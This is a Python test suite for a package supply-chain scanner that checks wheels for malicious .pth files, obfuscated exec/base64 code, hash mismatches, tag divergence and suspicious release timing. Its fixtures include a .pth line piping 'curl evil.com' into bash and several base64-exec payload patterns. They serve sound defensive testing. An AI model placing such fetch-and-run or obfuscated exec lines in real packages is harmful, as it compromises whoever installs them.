"""
Tests for safepip security checks.

Run with: python -m pytest -v
"""

from __future__ import annotations

import ast
import base64
import hashlib
import io
import json
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from pipsentinel.checks import (
    PackageMetadata,
    CheckResult,
    check_git_tag_divergence,
    check_pth_files_in_wheel,
    check_pypi_provenance,
    check_post_install_pth,
    check_multi_source_hash_consensus,
    check_wheel_record_integrity,
    check_obfuscated_code,
    check_release_timestamp_delta,
    check_post_install_record_diff,
)
from pipsentinel.lockfile import (
    LockfileManager,
    LockEntry,
    build_lock_entry,
    verify_against_lock,
)
from pipsentinel.report import SecurityReport


# ── Helpers ───────────────────────────────────────────────────────────────────

def make_meta(**kwargs) -> PackageMetadata:
    defaults = dict(
        name="testpkg",
        version="1.0.0",
        source_url="https://github.com/testorg/testpkg",
        pypi_release_date="2024-01-01T12:00:00",
        requires_python=">=3.10",
        wheel_urls=[],
        has_provenance=False,
        provenance_detail={},
    )
    defaults.update(kwargs)
    return PackageMetadata(**defaults)


def make_wheel(files: dict) -> bytes:
    """Create an in-memory zip (wheel) with given filename→content map."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            if isinstance(content, str):
                content = content.encode()
            zf.writestr(name, content)
    return buf.getvalue()


def make_wheel_with_record(py_files: dict) -> bytes:
    """Build a wheel with a correct RECORD manifest."""
    record_lines = []
    all_files = dict(py_files)

    for name, content in py_files.items():
        if isinstance(content, str):
            content = content.encode()
        sha = hashlib.sha256(content).hexdigest()
        record_lines.append(f"{name},sha256:{sha},{len(content)}")

    record_lines.append("testpkg-1.0.0.dist-info/RECORD,,")
    all_files["testpkg-1.0.0.dist-info/RECORD"] = "\n".join(record_lines)
    return make_wheel(all_files)


# ── CheckResult ───────────────────────────────────────────────────────────────

class TestCheckResult(unittest.TestCase):
    def test_str_passed(self):
        r = CheckResult("test", True, "info", "All good")
        self.assertIn("✅", str(r))

    def test_str_critical(self):
        r = CheckResult("test", False, "critical", "Bad!")
        self.assertIn("🚨", str(r))

    def test_str_warning(self):
        r = CheckResult("test", False, "warning", "Hmm")
        self.assertIn("⚠️", str(r))


# ── Git tag divergence ────────────────────────────────────────────────────────

class TestGitTagDivergence(unittest.TestCase):
    def test_no_source_url_returns_warning(self):
        meta = make_meta(source_url=None)
        result = check_git_tag_divergence(meta)
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "warning")

    def test_non_github_url_returns_warning(self):
        meta = make_meta(source_url="https://gitlab.com/org/repo")
        result = check_git_tag_divergence(meta)
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "warning")

    def test_matching_tag_passes(self):
        tags_response = json.dumps([
            {"name": "v1.0.0"}, {"name": "1.0.0"}
        ]).encode()
        mock_resp = MagicMock()
        mock_resp.read.return_value = tags_response
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)

        with patch("urllib.request.urlopen", return_value=mock_resp):
            result = check_git_tag_divergence(make_meta(version="1.0.0"))

        self.assertTrue(result.passed)
        self.assertIn(result.detail["matched_tag"], ["1.0.0", "v1.0.0"])

    def test_missing_tag_is_critical(self):
        tags_response = json.dumps([
            {"name": "v0.9.0"}, {"name": "v0.8.0"}
        ]).encode()
        mock_resp = MagicMock()
        mock_resp.read.return_value = tags_response
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)

        with patch("urllib.request.urlopen", return_value=mock_resp):
            result = check_git_tag_divergence(make_meta(version="1.0.0"))

        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")
        self.assertIn("LiteLLM", result.message)


# ── .pth file scan ────────────────────────────────────────────────────────────

class TestPthFilesInWheel(unittest.TestCase):
    def _mock_download(self, wheel_bytes: bytes):
        mock_resp = MagicMock()
        mock_resp.read.return_value = wheel_bytes
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        return mock_resp

    def test_no_wheel_entry_returns_warning(self):
        result = check_pth_files_in_wheel(make_meta(wheel_urls=[]))
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "warning")

    def test_clean_wheel_passes(self):
        wheel = make_wheel({"testpkg/__init__.py": b"# clean"})
        sha = hashlib.sha256(wheel).hexdigest()
        meta = make_meta(wheel_urls=[{
            "filename": "testpkg-1.0.0-py3-none-any.whl",
            "url": "https://example.com/testpkg.whl",
            "sha256": sha, "packagetype": "bdist_wheel",
        }])
        with patch("urllib.request.urlopen", return_value=self._mock_download(wheel)):
            result = check_pth_files_in_wheel(meta)
        self.assertTrue(result.passed)

    def test_clean_pth_passes(self):
        wheel = make_wheel({
            "testpkg/__init__.py": b"",
            "testpkg-1.0.0.dist-info/top_level.pth": b"/some/path\n/other/path\n",
        })
        sha = hashlib.sha256(wheel).hexdigest()
        meta = make_meta(wheel_urls=[{
            "filename": "testpkg-1.0.0-py3-none-any.whl",
            "url": "https://example.com/testpkg.whl",
            "sha256": sha, "packagetype": "bdist_wheel",
        }])
        with patch("urllib.request.urlopen", return_value=self._mock_download(wheel)):
            result = check_pth_files_in_wheel(meta)
        self.assertTrue(result.passed)

    def test_malicious_pth_detected(self):
        malicious_pth = b"import os; os.system('curl evil.com | bash')\n"
        wheel = make_wheel({
            "testpkg/__init__.py": b"",
            "testpkg_init.pth": malicious_pth,
        })
        sha = hashlib.sha256(wheel).hexdigest()
        meta = make_meta(wheel_urls=[{
            "filename": "testpkg-1.0.0-py3-none-any.whl",
            "url": "https://example.com/testpkg.whl",
            "sha256": sha, "packagetype": "bdist_wheel",
        }])
        with patch("urllib.request.urlopen", return_value=self._mock_download(wheel)):
            result = check_pth_files_in_wheel(meta)
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")
        self.assertIn("testpkg_init.pth", str(result.detail))

    def test_sha256_mismatch_is_critical(self):
        wheel = make_wheel({"testpkg/__init__.py": b""})
        meta = make_meta(wheel_urls=[{
            "filename": "testpkg-1.0.0-py3-none-any.whl",
            "url": "https://example.com/testpkg.whl",
            "sha256": "a" * 64, "packagetype": "bdist_wheel",
        }])
        with patch("urllib.request.urlopen", return_value=self._mock_download(wheel)):
            result = check_pth_files_in_wheel(meta)
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")
        self.assertIn("MISMATCH", result.message)


# ── PyPI provenance ───────────────────────────────────────────────────────────

class TestProvenance(unittest.TestCase):
    def test_no_provenance_is_warning(self):
        result = check_pypi_provenance(make_meta(has_provenance=False))
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "warning")

    def test_has_provenance_passes(self):
        result = check_pypi_provenance(
            make_meta(has_provenance=True, provenance_detail={"attestations": []})
        )
        self.assertTrue(result.passed)


# ── Post-install .pth audit ───────────────────────────────────────────────────

class TestPostInstallPth(unittest.TestCase):
    def test_clean_dir_passes(self):
        with tempfile.TemporaryDirectory() as td:
            Path(td, "mypath.pth").write_text("/some/path\n")
            result = check_post_install_pth([td])
        self.assertTrue(result.passed)

    def test_suspicious_pth_detected(self):
        with tempfile.TemporaryDirectory() as td:
            Path(td, "evil_init.pth").write_text("import subprocess; subprocess.run(['id'])\n")
            result = check_post_install_pth([td])
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")

    def test_nonexistent_dir_skipped(self):
        result = check_post_install_pth(["/nonexistent/path/xyz"])
        self.assertTrue(result.passed)


# ── SecurityReport ────────────────────────────────────────────────────────────

class TestSecurityReport(unittest.TestCase):
    def _sample_report(self) -> SecurityReport:
        r = SecurityReport("litellm", "1.82.8")
        r.results = [
            CheckResult("git_tag_divergence", False, "critical", "No tag found"),
            CheckResult("pth_files_in_wheel", False, "critical", "Malicious .pth detected"),
            CheckResult("pypi_provenance", False, "warning", "No provenance"),
        ]
        return r

    def test_not_safe_when_critical(self):
        r = self._sample_report()
        self.assertFalse(r.safe_to_install)
        self.assertEqual(r.risk_level, "CRITICAL")

    def test_safe_when_all_pass(self):
        r = SecurityReport("requests", "2.31.0")
        r.results = [
            CheckResult("git_tag_divergence", True, "info", "Tag found"),
            CheckResult("pth_files_in_wheel", True, "info", "No .pth"),
            CheckResult("pypi_provenance", True, "info", "Provenance ok"),
        ]
        self.assertTrue(r.safe_to_install)
        self.assertEqual(r.risk_level, "LOW")

    def test_summary_contains_package(self):
        r = self._sample_report()
        summary = r.summary()
        self.assertIn("litellm", summary)
        self.assertIn("1.82.8", summary)
        self.assertIn("DO NOT INSTALL", summary)

    def test_to_json_roundtrip(self):
        r = self._sample_report()
        data = json.loads(r.to_json())
        self.assertEqual(data["package"], "litellm")
        self.assertFalse(data["safe_to_install"])
        self.assertEqual(len(data["critical_failures"]), 2)


# ── Multi-source hash consensus ───────────────────────────────────────────────

class TestMultiSourceHashConsensus(unittest.TestCase):

    def _mock_url(self, body: bytes, content_type: str = "text/html"):
        resp = MagicMock()
        resp.read.return_value = body
        resp.headers = {"Content-Type": content_type}
        resp.__enter__ = lambda s: s
        resp.__exit__ = MagicMock(return_value=False)
        return resp

    def test_all_agree_passes(self):
        wheel = make_wheel({"testpkg/__init__.py": b""})
        sha = hashlib.sha256(wheel).hexdigest()
        meta = make_meta(wheel_urls=[{
            "filename": "testpkg-1.0.0-py3-none-any.whl",
            "url": "https://pypi.org/pkg.whl",
            "sha256": sha, "packagetype": "bdist_wheel",
        }])
        simple_html = f'<a href="/files/testpkg-1.0.0-py3-none-any.whl#sha256={sha}">pkg</a>'.encode()

        def mock_urlopen(req_or_url, timeout=None):
            url = req_or_url if isinstance(req_or_url, str) else req_or_url.full_url
            if "simple" in url:
                return self._mock_url(simple_html)
            return self._mock_url(wheel)

        with patch("urllib.request.urlopen", side_effect=mock_urlopen):
            result = check_multi_source_hash_consensus(meta)
        self.assertTrue(result.passed)
        self.assertIn("agree", result.message)

    def test_diverging_hashes_critical(self):
        wheel = make_wheel({"testpkg/__init__.py": b""})
        correct_sha = hashlib.sha256(wheel).hexdigest()
        tampered_sha = "a" * 64
        meta = make_meta(wheel_urls=[{
            "filename": "testpkg-1.0.0-py3-none-any.whl",
            "url": "https://pypi.org/pkg.whl",
            "sha256": tampered_sha, "packagetype": "bdist_wheel",
        }])
        simple_html = f'<a href="/files/testpkg-1.0.0-py3-none-any.whl#sha256={correct_sha}">pkg</a>'.encode()

        def mock_urlopen(req_or_url, timeout=None):
            url = req_or_url if isinstance(req_or_url, str) else req_or_url.full_url
            if "simple" in url:
                return self._mock_url(simple_html)
            return self._mock_url(wheel)

        with patch("urllib.request.urlopen", side_effect=mock_urlopen):
            result = check_multi_source_hash_consensus(meta)
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")
        self.assertIn("CONSENSUS FAILURE", result.message)

    def test_no_wheel_entry_returns_warning(self):
        result = check_multi_source_hash_consensus(make_meta(wheel_urls=[]))
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "warning")


# ── RECORD manifest integrity ─────────────────────────────────────────────────

class TestWheelRecordIntegrity(unittest.TestCase):

    def test_clean_record_passes(self):
        content = b"# clean code\n"
        sha = hashlib.sha256(content).hexdigest()
        record = f"testpkg/__init__.py,sha256:{sha},{len(content)}\ntestpkg-1.0.0.dist-info/RECORD,,\n"
        wheel = make_wheel({
            "testpkg/__init__.py": content,
            "testpkg-1.0.0.dist-info/RECORD": record,
        })
        self.assertTrue(check_wheel_record_integrity(wheel, "testpkg-1.0.0.whl").passed)

    def test_tampered_file_detected(self):
        original = b"# original\n"
        sha = hashlib.sha256(original).hexdigest()
        record = f"testpkg/__init__.py,sha256:{sha},{len(original)}\ntestpkg-1.0.0.dist-info/RECORD,,\n"
        wheel = make_wheel({
            "testpkg/__init__.py": b"# tampered content injected\n",
            "testpkg-1.0.0.dist-info/RECORD": record,
        })
        result = check_wheel_record_integrity(wheel, "testpkg-1.0.0.whl")
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")
        self.assertIn("INTEGRITY FAILURE", result.message)

    def test_missing_record_is_critical(self):
        wheel = make_wheel({"testpkg/__init__.py": b""})
        result = check_wheel_record_integrity(wheel, "testpkg-1.0.0.whl")
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")

    def test_file_absent_from_zip_flagged(self):
        record = "testpkg/ghost.py,sha256:{},10\ntestpkg-1.0.0.dist-info/RECORD,,\n".format("a" * 64)
        wheel = make_wheel({"testpkg-1.0.0.dist-info/RECORD": record})
        result = check_wheel_record_integrity(wheel, "testpkg-1.0.0.whl")
        self.assertFalse(result.passed)
        self.assertIn("ghost.py", str(result.detail))


# ── Obfuscated code detection ─────────────────────────────────────────────────

class TestObfuscatedCode(unittest.TestCase):

    def _wheel_with_code(self, code: str) -> bytes:
        return make_wheel({"testpkg/__init__.py": code.encode()})

    def test_clean_code_passes(self):
        result = check_obfuscated_code(self._wheel_with_code("import os\nprint('hello')\n"), "testpkg.whl")
        self.assertTrue(result.passed)

    def test_exec_base64_detected(self):
        code = "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n"
        result = check_obfuscated_code(self._wheel_with_code(code), "testpkg.whl")
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")

    def test_double_b64_detected(self):
        code = "import base64\nexec(base64.b64decode(base64.b64decode(b'...')).decode())\n"
        result = check_obfuscated_code(self._wheel_with_code(code), "testpkg.whl")
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")

    def test_subprocess_self_spawn_detected(self):
        code = "import subprocess, sys\nsubprocess.Popen([sys.executable, '-c', 'pass'])\n"
        result = check_obfuscated_code(self._wheel_with_code(code), "testpkg.whl")
        self.assertFalse(result.passed)

    def test_large_b64_blob_detected(self):
        payload = base64.b64encode(b"A" * 200).decode()
        result = check_obfuscated_code(self._wheel_with_code(f"DATA = '{payload}'\n"), "testpkg.whl")
        self.assertFalse(result.passed)
        self.assertIn("base64", result.detail["findings"][0]["description"].lower())

    def test_eval_compile_detected(self):
        result = check_obfuscated_code(
            self._wheel_with_code("eval(compile('pass', '<string>', 'exec'))\n"), "testpkg.whl"
        )
        self.assertFalse(result.passed)

    def test_pth_with_import_detected(self):
        wheel = make_wheel({
            "testpkg/__init__.py": b"",
            "testpkg_init.pth": b"import subprocess; subprocess.run(['id'])\n",
        })
        result = check_obfuscated_code(wheel, "testpkg.whl")
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")

    def test_ast_dynamic_exec_detected(self):
        result = check_obfuscated_code(
            self._wheel_with_code("x = get_payload()\nexec(decode_payload(x))\n"), "testpkg.whl"
        )
        self.assertFalse(result.passed)


# ── Release timestamp delta ───────────────────────────────────────────────────

class TestReleaseTimestampDelta(unittest.TestCase):

    def _mock_github(self, tag_date: str):
        def mock_urlopen(req_or_url, timeout=None):
            url = req_or_url if isinstance(req_or_url, str) else req_or_url.full_url
            resp = MagicMock()
            if "commits" in url:
                resp.read.return_value = json.dumps(
                    {"commit": {"committer": {"date": tag_date}}}
                ).encode()
            else:
                resp.read.return_value = json.dumps([
                    {"name": "v1.0.0", "commit": {"url": "https://api.github.com/repos/test/pkg/commits/abc"}},
                    {"name": "1.0.0",  "commit": {"url": "https://api.github.com/repos/test/pkg/commits/abc"}},
                ]).encode()
            resp.__enter__ = lambda s: s
            resp.__exit__ = MagicMock(return_value=False)
            return resp
        return mock_urlopen

    def test_normal_delta_passes(self):
        meta = make_meta(version="1.0.0", pypi_release_date="2024-01-01T12:30:00")
        with patch("urllib.request.urlopen", side_effect=self._mock_github("2024-01-01T12:00:00Z")):
            result = check_release_timestamp_delta(meta)
        self.assertTrue(result.passed)
        self.assertGreater(result.detail["delta_minutes"], 5)

    def test_suspicious_short_delta_warning(self):
        meta = make_meta(version="1.0.0", pypi_release_date="2024-01-01T12:00:45")
        with patch("urllib.request.urlopen", side_effect=self._mock_github("2024-01-01T12:00:00Z")):
            result = check_release_timestamp_delta(meta)
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "warning")

    def test_normal_ci_delta_passes(self):
        meta = make_meta(version="1.0.0", pypi_release_date="2024-01-01T12:04:24")
        with patch("urllib.request.urlopen", side_effect=self._mock_github("2024-01-01T12:00:00Z")):
            result = check_release_timestamp_delta(meta)
        self.assertTrue(result.passed)

    def test_publish_before_tag_is_critical(self):
        meta = make_meta(version="1.0.0", pypi_release_date="2024-01-01T11:50:00")
        with patch("urllib.request.urlopen", side_effect=self._mock_github("2024-01-01T12:00:00Z")):
            result = check_release_timestamp_delta(meta)
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")
        self.assertIn("BEFORE", result.message)

    def test_no_source_url_warning(self):
        result = check_release_timestamp_delta(make_meta(source_url=None))
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "warning")


# ── Lockfile manager ──────────────────────────────────────────────────────────

class TestLockfileManager(unittest.TestCase):

    def test_roundtrip_put_get(self):
        with tempfile.TemporaryDirectory() as td:
            mgr = LockfileManager(Path(td) / "test.lock")
            entry = LockEntry("requests", "2.31.0", "2024-01-01T00:00:00Z",
                              "abc123", {"requests/__init__.py": "sha256:def456"})
            mgr.put(entry)
            got = mgr.get("requests", "2.31.0")
            self.assertIsNotNone(got)
            self.assertEqual(got.wheel_sha256, "abc123")
            self.assertEqual(got.record, {"requests/__init__.py": "sha256:def456"})

    def test_missing_returns_none(self):
        with tempfile.TemporaryDirectory() as td:
            self.assertIsNone(LockfileManager(Path(td) / "test.lock").get("nonexistent", "1.0.0"))

    def test_case_insensitive_key(self):
        with tempfile.TemporaryDirectory() as td:
            mgr = LockfileManager(Path(td) / "test.lock")
            mgr.put(LockEntry("LiteLLM", "1.82.6", "2024-01-01T00:00:00Z", "abc", {}))
            self.assertIsNotNone(mgr.get("litellm", "1.82.6"))

    def test_remove_works(self):
        with tempfile.TemporaryDirectory() as td:
            mgr = LockfileManager(Path(td) / "test.lock")
            mgr.put(LockEntry("pkg", "1.0.0", "2024-01-01T00:00:00Z", "abc", {}))
            self.assertTrue(mgr.remove("pkg", "1.0.0"))
            self.assertIsNone(mgr.get("pkg", "1.0.0"))

    def test_persists_across_instances(self):
        with tempfile.TemporaryDirectory() as td:
            lock_path = Path(td) / "test.lock"
            LockfileManager(lock_path).put(LockEntry("pkg", "1.0.0", "2024-01-01T00:00:00Z", "hash123", {}))
            got = LockfileManager(lock_path).get("pkg", "1.0.0")
            self.assertIsNotNone(got)
            self.assertEqual(got.wheel_sha256, "hash123")


class TestVerifyAgainstLock(unittest.TestCase):

    def test_matching_wheel_passes(self):
        wheel = make_wheel({"pkg/__init__.py": b"clean"})
        sha = hashlib.sha256(wheel).hexdigest()
        passed, _ = verify_against_lock(LockEntry("pkg", "1.0.0", "2024-01-01T00:00:00Z", sha, {}), wheel)
        self.assertTrue(passed)

    def test_tampered_wheel_fails(self):
        wheel = make_wheel({"pkg/__init__.py": b"clean"})
        sha = hashlib.sha256(wheel).hexdigest()
        tampered = make_wheel({"pkg/__init__.py": b"INJECTED"})
        passed, msg = verify_against_lock(LockEntry("pkg", "1.0.0", "2024-01-01T00:00:00Z", sha, {}), tampered)
        self.assertFalse(passed)
        self.assertIn("MISMATCH", msg)


class TestBuildLockEntry(unittest.TestCase):

    def test_extracts_record(self):
        content = b"# code\n"
        sha = hashlib.sha256(content).hexdigest()
        record = f"pkg/__init__.py,sha256:{sha},{len(content)}\npkg-1.0.0.dist-info/RECORD,,\n"
        wheel = make_wheel({"pkg/__init__.py": content, "pkg-1.0.0.dist-info/RECORD": record})
        entry = build_lock_entry("pkg", "1.0.0", wheel)
        self.assertIn("pkg/__init__.py", entry.record)
        self.assertEqual(entry.record["pkg/__init__.py"], f"sha256:{sha}")

    def test_wheel_sha256_correct(self):
        wheel = make_wheel({"pkg/__init__.py": b""})
        entry = build_lock_entry("pkg", "1.0.0", wheel)
        self.assertEqual(entry.wheel_sha256, hashlib.sha256(wheel).hexdigest())


if __name__ == "__main__":
    unittest.main(verbosity=2)
